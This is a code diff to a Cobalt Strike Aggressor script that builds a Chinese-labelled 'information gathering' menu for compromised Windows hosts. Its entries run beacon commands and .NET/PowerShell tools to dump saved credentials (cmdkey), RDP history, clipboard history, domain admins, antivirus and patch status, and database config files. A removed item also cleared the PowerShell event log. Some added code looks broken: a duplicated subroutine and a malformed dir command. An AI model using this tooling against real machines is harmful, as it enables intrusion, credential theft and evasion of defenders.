@@ -15,15 +15,10 @@ menu "信息收集" {
 				bshell($1, "dir \\\\.\\pipe\\\\ | findstr \"QQ_\" | findstr \"_pipe\"");
 			}
 		}	
-				item "获取RDP端口" {
-            local('$bid');
-            foreach $bid ($1){
-                blog($1, "Check Rdp Open Port");
-                bpowershell_import($bid, script_resource("/script/RegRdpPort.ps1"));
-                bpowerpick($bid,"RegRdpPort");
-                bshell($bid,"wevtutil cl \"Windows PowerShell\"");
-                }
-            }
+
+			item "获取当前主机类型" {
+			bexecute_assembly($1, script_resource("/script/SharpChassisType.exe"), "");
+		}
 				item "查看cmd历史命令" {
 			local('$bid');
 			foreach $bid ($1){
@@ -84,19 +79,57 @@ menu "信息收集" {
 				bshell($1, "net group \"domain admins\" /domain");
 			}
 		}
-
+			    item "查找数据库配置文件" {
+             prompt_text("网站目录", "", lambda({
+            bshell(@ids, "dir / a / s / b \"$1\ * config *\"");
+        }, @ids => $1));
+    }
 				item "systeminfo" {
 			local('$bid');
 			foreach $bid ($1){
 				bshell($1, "systeminfo");
 			}
 		}
-				item "mstsc记录" {
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "cmdkey /list");
-			}
-		}
+    menu "查看mstsc记录"{
+	            item "查看所有用户的记录"{
+                $bid = $1['@'];
+                $Dialog = dialog("listlog",%(bid => $bid),&listlog);
+                dialog_description($Dialog, "Mstsc");
+                dbutton_action($Dialog, "运行");
+                dialog_show($Dialog);
+            }
+sub listlog {
+	local('$script');
+
+	$oneliner = beacon_host_script($bid);
+
+	bpowershell_import!($bid, script_resource("/script/ListAllUsers.ps1"));
+	bpowerpick!($bid, "\" $+ $oneliner $+ \"");
+
+	bpause($bid, 10000);
+
+}
+
+	            item "查看已登录用户的记录"{
+                $bid = $1['@'];
+                $Dialog = dialog("listlog",%(bid => $bid),&listlog);
+                dialog_description($Dialog, "Mstsc");
+                dbutton_action($Dialog, "运行");
+                dialog_show($Dialog);
+            }
+}
+sub listlog {
+	local('$script');
+
+
+	$oneliner = beacon_host_script($bid);
+
+	bpowershell_import!($bid, script_resource("/script/ListLogged-inUsers.ps1"));
+	bpowerpick!($bid, "\" $+ $oneliner $+ \"");
+
+	bpause($bid, 10000);
+
+}
 				item "枚举当前域" {
 			local('$bid');
 			foreach $bid ($1){
@@ -122,7 +155,7 @@ sub SharpEventLog {
 			item "SharpWebScan" {
 			$bid = $1['@'];
 			$dialog = dialog("SharpWebScan", %(iptype => "-IP",ip => beacon_info($bid,"internal"),port => "80,8080,8001,1433",bid => $bid), &SharpWebScan);
-			dialog_description($dialog, "多端口web标题扫描");
+			dialog_description($dialog, "扫描web应用,返回web地址和title。");
 			drow_text($dialog, "ip", "ip:  ");	
 			drow_text($dialog, "port", "ports:  ");			
 			drow_combobox($dialog, "iptype", "-ip/-cip", @("-IP", "-CIP"));
@@ -161,6 +194,18 @@ sub SharpSQLDump {
 }	
 		item "SharpClipHistory" {
 			bexecute_assembly($1, script_resource("/script/SharpClipHistory.exe"), "");
-		}	
+		}
+	        item "SharpAVKB" {
+			$bid = $1;
+			$dialog = dialog("SharpAVKB", %(type => "-AV",bid => $bid), &SharpAVKB);
+			dialog_description($dialog, "Windows杀软对比和补丁号对比。");
+			drow_combobox($dialog, "type", "type:", @("-AV", "-KB"));
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub SharpAVKB {
+	bexecute_assembly($bid, script_resource("/script/SharpAVKB.exe"), $3['type']);
+}	
+	
 			
 	}
